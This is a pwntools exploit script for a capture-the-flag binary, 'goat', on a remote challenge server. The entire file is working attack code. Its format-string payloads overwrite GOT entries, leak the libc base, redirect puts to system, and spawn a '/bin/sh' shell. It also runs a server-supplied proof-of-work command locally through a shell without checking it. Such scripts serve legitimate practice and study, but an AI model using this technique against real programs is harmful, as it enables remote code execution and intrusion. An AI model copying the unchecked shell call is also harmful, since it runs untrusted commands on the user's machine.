#!/usr/bin/env python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './goat_patched'
elf = context.binary = ELF(exe, checksec=True)
libc = './libc.so.6'
libc = ELF(libc, checksec=False)
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h", "-p", "65"]
host, port = 'goat.chal.cyberjousting.com', 1349

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        io = remote(host, port)
        # solve PoW
        io.recvuntil(b"proof of work:\n")
        pow_cmd = io.recvline().strip().decode()
        log.info(f"Running PoW command: {pow_cmd}")
        solution = subprocess.check_output(pow_cmd, shell=True).strip()
        print(solution)
        io.recvuntil(b"solution:")
        io.sendline(solution)
        return io
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg

# break *0x4012b0

# break *0x401355

break *0x401326
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
def write_ptr(addr, value):
    offset = 0x7
    for i in range(6):
        payload = b''
        val = value & 0xff
        value = value >> 8

        if (addr+i) & 0xff == 0x0a:
            continue

        if val >= 0x18:
            payload = (f'%{val-0x18}c'.encode() + f'%{offset+3}$hhn'.encode()).ljust(0x10, b'\x00')
        else:
            payload = (f'%{0xff+val-0x18+1}c'.encode() + f'%{offset+3}$hhn'.encode()).ljust(0x10, b'\x00')
        payload += p64(addr+i)    
        
        log.info("writing %#x to %#x", val, addr+i)
        io.sendlineafter(b'?', payload)
        io.sendlineafter(b':', b'idk')

def exploit():
    global io
    io = initialize()

    offset = 0x7
    payload = (f'%{0xa0-0x18}c'.encode() + f'%{offset+4}$hhn'.encode()).ljust(0x18, b'\x00')
    payload += p64(elf.got['strncmp']) 
    io.sendlineafter(b'?', payload)

    payload = b'%9$s'.ljust(0x8, b'\x00')
    payload += p64(elf.got['fgets'])
    io.sendlineafter(b'?', payload)

    io.recvuntil(b'said:\n')
    io.recvuntil(b'said:\n')
    libc.address = u64(io.recv(6).ljust(8, b'\x00')) - libc.sym['fgets']
    io.sendline(b'idk')

    val = (libc.sym['system'] >> 16) & 0xff
    payload = (f'%{(val<<8)-0x18}c'.encode() + f'%{offset+3}$hn'.encode()).ljust(0x10, b'\x00')
    payload += p64(elf.got['puts']+1)
    io.sendlineafter(b'?', payload)
    io.sendline(b'idk')
    write_ptr(elf.got['puts'], libc.sym['system'])

    payload = (f'%{0x40-0x18}c'.encode() + f'%{offset+3}$hhn'.encode()).ljust(0x10, b'\x00')
    payload += p64(elf.got['strncmp']) 
    io.sendlineafter(b'?', payload)

    io.sendline(b'/bin/sh\x00')

    log.info('libc base: %#x', libc.address)
    io.interactive()
    
if __name__ == '__main__':
    exploit()
